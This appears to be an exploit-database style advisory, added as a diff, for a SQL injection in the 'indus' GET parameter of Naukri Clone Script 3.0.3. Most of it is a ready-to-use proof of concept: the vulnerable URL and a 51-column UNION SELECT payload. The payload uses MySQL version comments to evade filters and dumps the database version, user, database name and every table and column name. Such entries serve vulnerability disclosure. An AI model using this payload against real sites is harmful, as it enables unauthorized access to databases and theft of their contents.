@@ -1,0 +1,24 @@
+# Exploit Title: Naukri Clone Script 3.0.3 - 'indus' SQL Injection
+# Dork: N/A
+# Date: 2018-02-08
+# Exploit Author: Borna nematzadeh (L0RD) or borna.nematzadeh123@gmail.com
+# Vendor Homepage: https://www.phpscriptsmall.com/product/naukri-clone-script/
+# Version: 3.0.3
+# Category: Webapps
+# CVE: N/A
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands.
+# # # # #
+# Proof of Concept :
+
+SQLi:
+
+#
+http://localhost/jobsite-advanced/searchresult.php?searchindus&indus=[SQL]
+
+# Parameter : indus (GET)
+#    Type: UNION QUERY
+#    Title: Generic UNION query (NULL) - 51 columns
+#    payload : UNION SELECT
+NULL,NULL,NULL,/*!00000Concat(0x3C62723E,version(),0x3C62723E,user(),0x3C62723E,database())*/,NULL,NULL,NULL,/*!00000group_coNcat(0x3C62723E,table_name,0x3a,column_name)*/,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/*!00000from*/ information_schema.columns where table_schema=database()%23
